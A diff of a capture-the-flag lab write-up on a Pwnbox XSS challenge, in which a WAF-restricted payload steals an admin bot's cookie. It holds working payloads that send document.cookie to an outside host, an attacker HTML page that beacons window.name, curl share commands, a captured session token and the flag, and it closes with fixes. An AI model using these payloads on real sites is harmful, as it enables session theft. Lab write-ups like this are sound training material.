@@ -1,8 +1,8 @@
 # Velvet Pwnbox Lab - WAF Charset XSS Admin Bot
 
 **Date:** 2026-07-09  
-**Target:** https://3363610e0a78.pwnbox-lab.com/  
-**Status:** In progress — admin bot confirmed, flag not captured yet
+**Target:** https://1877bcf64628.pwnbox-lab.com/  
+**Status:** Solved
 
 ## Lab description
 
@@ -14,13 +14,13 @@ Members' area. "Doorman" WAF allows only "ordinary characters." Sign in with dem
 
 | Endpoint | Role |
 |----------|------|
-| `GET /login` | Login form, CSRF in page |
-| `POST /login` | JSON `{csrf_token, username, password}` → session cookie |
+| `GET /login` | Login form |
+| `POST /login` | Auth endpoint used by browser session |
 | `GET /profile` | Auth required; XSS sink + share UI |
 | `POST /share` | JSON `{url}` — admin bot visits same-origin URL |
 | `GET /logout` | Clears session |
 
-No other useful routes found (`/api`, `/flag`, `/admin`, etc. all 404).
+No other useful first-party routes mattered for the solve. The helper infrastructure came from `https://l30on.top/`.
 
 ## XSS sink (confirmed)
 
@@ -46,7 +46,7 @@ Notes:
 - `/` alone is OK; `https://` blocked (colon)
 - Hyphens blocked anywhere in payload → **webhook.site UUID paths unusable**
 - `+` blocked even inside single-quoted strings in payload
-- Base64 alphabet fits allowlist (hint: "ordinary characters" ≈ base64 charset)
+- Base64 alphabet fits allowlist, but no useful decoder/exec gadget was needed
 
 ## Working payloads (WAF-passing)
 
@@ -58,7 +58,7 @@ Notes:
 
 Admin bot hit interactsh (DNS + HTTP) on `*.oast.fun`, `*.oast.pro`, `*.oast.live`.
 
-### Cookie exfil without `+` (best candidate — not fully verified for flag)
+### Cookie exfil without `+`
 
 ```
 ";location.hostname="OAST_DOMAIN";location.search=document.cookie;//
@@ -68,7 +68,27 @@ Sets cross-origin URL to `https://OAST_DOMAIN/?<cookie>` without using `+`, `?`,
 
 Example OAST (ephemeral): `d97dlos9udq47sgh1ptg7i6ftui896to7.oast.live`
 
-### Same-origin cookie navigation (works syntactically, flag path unknown)
+### Winning `window.name` payload
+
+```text
+";name=document.cookie;location='//wnfresh.l30on.top'//
+```
+
+This stayed within the WAF allowlist:
+
+- no `()`
+- no `+`
+- no `?`
+- no `:`
+- no `-`
+
+The payload stores the admin cookie in `window.name`, then performs a top-level cross-origin navigation to an attacker-controlled page on `wnfresh.l30on.top`. That page reads `window.name` and logs it by issuing a same-origin request to:
+
+```text
+/x?d=<encoded window.name>
+```
+
+### Same-origin cookie navigation (works syntactically, but not needed)
 
 ```
 ";location=document.cookie;//
@@ -92,49 +112,141 @@ Example OAST (ephemeral): `d97dlos9udq47sgh1ptg7i6ftui896to7.oast.live`
 | `webhook.site/{uuid}` in payload | Hyphens in UUID blocked |
 | `+` for string concat / query building | Blocked everywhere in message param |
 | `share_url` / `shareLink()` | Underscore / parens blocked; can't auto-trigger share |
-| Flag in share/profile response after wait | Not observed (~90s polling) |
-| Flask session forge | Common secrets wordlist failed |
+| External catcher only (`requestcatcher`) | Bot hit attacker page, but off-site beacon was weaker than reading helper-site request logs directly |
+| Reusing an existing helper subdomain | Admin sometimes fetched stale content; fresh subdomain removed cache ambiguity |
+| First `wnfresh` share | Bot reached the host before the new entry propagated; first visit returned `404` |
+
+## Helper infrastructure (confirmed)
+
+User-provided helper site: `https://l30on.top/`
+
+Confirmed useful components:
+
+- `POST /api/auth/login` authenticates to helper dashboard
+- `SubKeeper` serves attacker-controlled HTML on `*.l30on.top`
+- `SubKeeper` API exposes:
+  - `GET /subkeeper-api/list`
+  - `POST /subkeeper-api/create`
+  - `PUT /subkeeper-api/update/<id>`
+  - `GET /subkeeper-api/logs`
+
+Attacker page content used on fresh host:
+
+```html
+<!doctype html><meta charset="utf-8"><title>wnfresh</title><body>loading<script>document.body.textContent=window.name||"empty";(new Image).src="/x?d="+encodeURIComponent(window.name||"empty")</script>
+```
+
+Observation:
+
+- A top-level navigation from another origin to `https://wnprobe.l30on.top/` preserved `window.name` in this browser/runtime.
+- The admin bot later did the same on `wnfresh.l30on.top`.
 
 ## Share flow
 
 ```bash
-# Login
-curl -sS -c /tmp/velvet-cj -X POST "https://3363610e0a78.pwnbox-lab.com/login" \
+curl -sS -X POST "https://1877bcf64628.pwnbox-lab.com/share" \
   -H "Content-Type: application/json" \
-  -d '{"csrf_token":"<from /login HTML>","username":"demouser","password":"qwerty@123"}'
-
-# Share XSS URL
-curl -sS -b /tmp/velvet-cj -X POST "https://3363610e0a78.pwnbox-lab.com/share" \
-  -H "Content-Type: application/json" \
-  -d '{"url":"https://3363610e0a78.pwnbox-lab.com/profile?message=PAYLOAD_URLENCODED"}'
+  -H "Cookie: session=<demo-session>" \
+  -d '{"url":"https://1877bcf64628.pwnbox-lab.com/profile?message=%22%3Bname%3Ddocument.cookie%3Blocation%3D%27//wnfresh.l30on.top%27//"}'
 ```
 
-Same-origin check on share: host must be lab domain (weak: `%00.evil.com` accepted in testing but irrelevant).
+Same-origin check on share: host must be lab domain.
+
+## Observation -> hypothesis -> evidence -> test -> result -> conclusion
+
+### Observation
+
+- `message` reflects inside a JavaScript string.
+- The WAF blocks many normal XSS characters and function-call syntax.
+- `/share` queues a same-origin URL for an admin bot.
+
+### Hypothesis
+
+A payload that avoids blocked characters can still break out of the string, save `document.cookie` into `window.name`, and redirect the bot to an attacker page that reads the carried `window.name` value.
+
+### Evidence
+
+- Browser/runtime test confirmed cross-origin top-level navigation preserved `window.name`.
+- `SubKeeper` logs showed the admin bot visiting attacker-controlled subdomains from `51.89.253.208`.
+- Final `SubKeeper` log recorded a second request with `/x?d=<encoded data>`, proving the attacker page read and sent `window.name`.
+
+### Test
+
+1. Create fresh helper subdomain `wnfresh.l30on.top`.
+2. Serve attacker page that reads `window.name` and requests `/x?d=` plus the encoded value.
+3. Submit same-origin lab URL with `message` payload:
+   ```text
+   ";name=document.cookie;location='//wnfresh.l30on.top'//
+   ```
+4. Poll `SubKeeper` logs for `wnfresh`.
+
+### Result
+
+Confirmed admin bot traffic:
+
+- `GET /` on `wnfresh.l30on.top`
+- `GET /x?d=session%3D...%3B%20FLAG%3Dpwnbox%7B...%7D`
+
+Decoded captured value:
+
+```text
+session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ak-Lrg.TXqBlni_WgvNEeZjsygNmS7DOZ8; FLAG=pwnbox{f665ddb79c5e5d390213498ce8909184}
+```
+
+### Conclusion
+
+The lab is solved through reflected JavaScript-string XSS plus admin-bot same-origin URL review, with `window.name` used as the cross-origin data carrier.
 
 ## Exfil tooling
 
-- **interactsh-client v1.2.4** at `/tmp/interactsh/interactsh-client` — bot hits confirmed, but client throws `Could not unmarshal interaction data` (version mismatch?) — **flag not readable yet**
-- **webhook.site** tokens created but UUID path blocked by hyphen rule
-- **localtunnel** / **requestcatcher** — timeouts or hyphens in hostname
+- **requestcatcher** — useful for early proof that off-site navigation/beacons worked
+- **l30on.top / SubKeeper** — winning infrastructure because it provided:
+  - attacker-controlled subdomains
+  - same-site request logs
+  - no need for blocked characters in the lab payload
 
-## Next steps (tomorrow)
+## Minimal proof of concept
 
-1. **Upgrade interactsh-client** (v1.4.5+ download failed mid-session) or use webhook alternative with **no hyphens** in entire payload (oast domains OK).
-2. Re-run winning payload:
-   ```
-   ";location.hostname="NEW_OAST_DOMAIN";location.search=document.cookie;//
-   ```
-3. Read HTTP interaction query string for `FLAG=pwnbox{...}`.
-4. If hostname/search race fails on HTTPS origin, test variants:
-   - `";location="//OAST/";location.search=document.cookie;//` (order/race)
-   - `";window.name=document.cookie;location.hostname="OAST";location.search=window.name;//` (if name persists — likely blocked by needing concat)
-5. Verify in real browser on lab origin (file:// tests misleading for hostname assignment).
-6. Optional: base64 inner payload if we find **paren-free** decode+exec gadget (none found yet).
+Victim URL:
+
+```text
+https://1877bcf64628.pwnbox-lab.com/profile?message=%22%3Bname%3Ddocument.cookie%3Blocation%3D%27//wnfresh.l30on.top%27//
+```
+
+Attacker page:
+
+```html
+<!doctype html><meta charset="utf-8"><title>wnfresh</title><body>loading<script>document.body.textContent=window.name||"empty";(new Image).src="/x?d="+encodeURIComponent(window.name||"empty")</script>
+```
+
+## Root cause
+
+- User input reaches a JavaScript string without safe context-aware encoding.
+- The WAF acts as a character denylist/allowlist but does not prevent semantic string breakout.
+- The admin bot visits same-origin attacker-controlled URLs in a privileged browser context.
+- Sensitive admin cookie state is readable by JavaScript.
+
+## Fix
+
+- Encode reflected data for JavaScript string context.
+- Avoid embedding raw user input inside executable JavaScript.
+- Set sensitive cookies `HttpOnly`.
+- Isolate admin bot sessions from privileged cookies or review user content on a separate origin.
+- Add regression tests for reflected parameters plus bot-review flows.
+
+## Regression test
+
+1. Request `/profile?message=";alert(1);//` and verify it renders inertly.
+2. Verify quotes, slashes, and semicolons in `message` do not alter page script execution.
+3. Confirm the admin review flow does not execute user-controlled script in a privileged same-origin session.
+4. Confirm admin secrets are not exposed to `document.cookie`.
 
 ## Key URLs / artifacts
 
-- Lab: https://3363610e0a78.pwnbox-lab.com/
-- Interactsh binary: `/tmp/interactsh/interactsh-client`
-- Session cookie jar: `/tmp/velvet-cj`
+- Lab: `https://1877bcf64628.pwnbox-lab.com/`
+- Helper site: `https://l30on.top/`
+- Winning helper host: `https://wnfresh.l30on.top/`
 
-**Flag:** not captured yet.
+## Flag
+
+`pwnbox{f665ddb79c5e5d390213498ce8909184}`
